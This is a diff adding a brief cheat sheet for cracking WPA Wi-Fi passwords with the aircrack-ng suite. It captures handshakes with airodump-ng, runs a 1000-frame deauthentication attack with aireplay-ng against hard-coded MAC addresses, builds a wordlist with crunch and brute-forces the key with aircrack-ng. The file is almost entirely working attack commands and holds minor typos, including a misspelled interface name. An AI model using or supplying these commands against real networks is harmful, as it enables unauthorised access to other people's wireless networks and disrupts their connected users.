@@ -1,0 +1,12 @@
+: WPA cracking :
+: if wps not enabled :
+airodump-ng wlan0mon
+: fetch packets to capture the handshake :
+airodump-ng --bssid [address of the target ap] --channel [channel-id] --write testhack wlan0mono 
+: we can use deauth to get handshake  :    04:95:E6:40:B4:30  
+aireplay-ng --deauth 1000 -a C4:0B:CB:67:7E:87  -c B0:35:9F:68:F4:F7  wlan0mon :
+: as we will get the handshake we will now use tool crunch to get the word list and use to crack it :
+crunch 5 8  123456 -o sample
+: now need to use wordlist to crack the password :
+aircrack-ng [filename in which packets are captured in .cap extension] -w [file neame in which words are stored]
+
